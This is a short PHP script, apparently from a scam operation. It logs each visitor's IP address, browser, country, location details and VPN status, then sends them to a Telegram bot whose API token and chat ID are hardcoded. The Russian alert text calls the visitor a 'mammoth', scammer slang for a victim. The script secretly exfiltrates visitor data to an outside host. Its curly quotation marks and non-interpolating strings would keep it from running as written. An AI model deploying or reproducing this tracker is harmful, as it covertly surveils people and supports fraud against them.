<?php

/* 
Please keep this copyright statement intact
Creator: Jeroenimo02#2380
Publish Date: 19-03-2021
Last Update: 18-03-2022
APIs Provided By: geoiplookup.io and ip-api.com
*/ 

//Get the visitor's IP
$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
$Browser = $_SERVER['HTTP_USER_AGENT'];


//Check if IP is a VPN (Is not always correct!)
$Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));
$VPNConn = json_decode(file_get_contents("https://json.geoiplookup.io/{$IP}"));
if ($VPNConn->connection_type === "Corporate") {
    $VPN = "Yes";
} else {
    $VPN = "No";
}

//Set some variables
$Country = $Details->country;
$CountryCode = $Details->countryCode;
$Region = $Details->regionName;
$City = $Details->city;
$Zip = $Details->zip;
$Lat = $Details->lat;
$Lon = $Details->lon;
$WebhookName = $IP;
$apiToken = “4334584910:AAEPmjlh84N62Lv3jGWEgOftlxxAfMhB1gs”; 
$data = [ 
    ‘chat_id’ => ‘6817925852’, 
    ‘text’ => ‘Мамонт зашел на сайт
    IP: $IP
    Браузер: $Browser
    Страна: $Country
    VPN: $VPN’ 
   ]; 

$response = file_get_contents(“http://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) ); 
?>
